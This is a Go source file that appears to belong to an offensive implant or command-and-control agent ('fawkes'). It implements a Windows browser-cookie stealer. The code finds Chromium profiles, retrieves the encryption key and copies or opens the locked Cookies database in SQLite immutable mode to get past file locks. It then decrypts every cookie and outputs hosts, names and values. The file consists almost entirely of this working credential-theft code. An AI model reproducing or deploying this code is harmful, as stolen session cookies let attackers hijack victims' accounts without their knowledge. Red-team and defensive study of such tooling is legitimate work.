//go:build windows

package commands

import (
	"database/sql"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// findCookieProfiles returns profile directories containing Cookies or Network/Cookies
func findCookieProfiles(userDataDir string) []string {
	var profiles []string

	checkProfile := func(dir string) {
		// Chrome 96+ stores cookies in Network/Cookies
		networkCookies := filepath.Join(dir, "Network", "Cookies")
		if _, err := os.Stat(networkCookies); err == nil {
			profiles = append(profiles, dir)
			return
		}
		// Older versions store in profile/Cookies
		cookies := filepath.Join(dir, "Cookies")
		if _, err := os.Stat(cookies); err == nil {
			profiles = append(profiles, dir)
		}
	}

	checkProfile(filepath.Join(userDataDir, "Default"))

	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}
	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			checkProfile(filepath.Join(userDataDir, entry.Name()))
		}
	}

	return profiles
}

// cookieDBPath returns the path to the Cookies database for a profile
func cookieDBPath(profileDir string) string {
	// Chrome 96+ path
	networkPath := filepath.Join(profileDir, "Network", "Cookies")
	if _, err := os.Stat(networkPath); err == nil {
		return networkPath
	}
	return filepath.Join(profileDir, "Cookies")
}

func browserCookies(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine LOCALAPPDATA path")
	}

	var allCookies []browserCookie
	var errors []string

	for browserName, userDataDir := range paths {
		func() {
			if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
				return
			}

			key, err := getEncryptionKey(userDataDir)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
				return
			}
			defer structs.ZeroBytes(key)

			profiles := findCookieProfiles(userDataDir)
			if len(profiles) == 0 {
				errors = append(errors, fmt.Sprintf("%s: no profiles with Cookies found", browserName))
				return
			}

			for _, profileDir := range profiles {
				dbPath := cookieDBPath(profileDir)
				profileName := filepath.Base(profileDir)

				// Strategy 1: Copy DB to temp file, open from copy
				tf, tfErr := os.CreateTemp("", "")
				if tfErr == nil {
					tmpFile := tf.Name()
					tf.Close()
					if copyErr := copyFile(dbPath, tmpFile); copyErr == nil {
						cookies, readErr := readCookieData(tmpFile, key, browserName, profileName)
						secureRemove(tmpFile)
						if readErr == nil {
							allCookies = append(allCookies, cookies...)
							continue
						}
						errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, readErr))
						continue
					}
					secureRemove(tmpFile)
				}

				// Strategy 2: Open locked DB directly in immutable mode (no locking)
				// URI format tells SQLite the file won't change, skipping all locks
				immutableURI := "file:///" + filepath.ToSlash(dbPath) + "?immutable=1"
				cookies, err := readCookieData(immutableURI, key, browserName, profileName)
				if err != nil {
					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
					continue
				}
				allCookies = append(allCookies, cookies...)
			}
		}()
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Cookies (%d found) ===\n\n", len(allCookies)))

	for _, c := range allCookies {
		flags := ""
		if c.Secure {
			flags += " Secure"
		}
		if c.HTTPOnly {
			flags += " HttpOnly"
		}
		sb.WriteString(fmt.Sprintf("[%s] %s  %s=%s  (path=%s%s)\n",
			c.Browser, c.Host, c.Name, truncStr(c.Value, 80), c.Path, flags))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	if len(allCookies) == 0 && len(errors) == 0 {
		sb.WriteString("No Chromium-based browsers found or no cookies.\n")
	}

	return successResult(sb.String())
}

func readCookieData(dbPath string, key []byte, browserName, profileName string) ([]browserCookie, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, fmt.Errorf("open database: %w", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies WHERE encrypted_value IS NOT NULL AND length(encrypted_value) > 0")
	if err != nil {
		return nil, fmt.Errorf("query cookies: %w", err)
	}
	defer rows.Close()

	var cookies []browserCookie
	label := browserName
	if profileName != "Default" {
		label = fmt.Sprintf("%s (%s)", browserName, profileName)
	}

	var total, decryptFails int
	for rows.Next() {
		var host, name, path string
		var encValue []byte
		var expiresUTC int64
		var isSecure, isHTTPOnly int

		if err := rows.Scan(&host, &name, &encValue, &path, &expiresUTC, &isSecure, &isHTTPOnly); err != nil {
			continue
		}

		if len(encValue) == 0 {
			continue
		}

		total++
		value, err := decryptPassword(encValue, key)
		if err != nil || value == "" {
			decryptFails++
			continue
		}

		cookies = append(cookies, browserCookie{
			Browser:  label,
			Host:     host,
			Name:     name,
			Value:    value,
			Path:     path,
			Expires:  expiresUTC,
			Secure:   isSecure != 0,
			HTTPOnly: isHTTPOnly != 0,
		})
	}
	if err := rows.Err(); err != nil {
		return cookies, fmt.Errorf("row iteration error: %w", err)
	}

	if decryptFails > 0 && len(cookies) == 0 {
		return cookies, fmt.Errorf("all %d cookies failed to decrypt (Chrome 127+/Edge App-Bound Encryption may be active)", total)
	}

	return cookies, nil
}
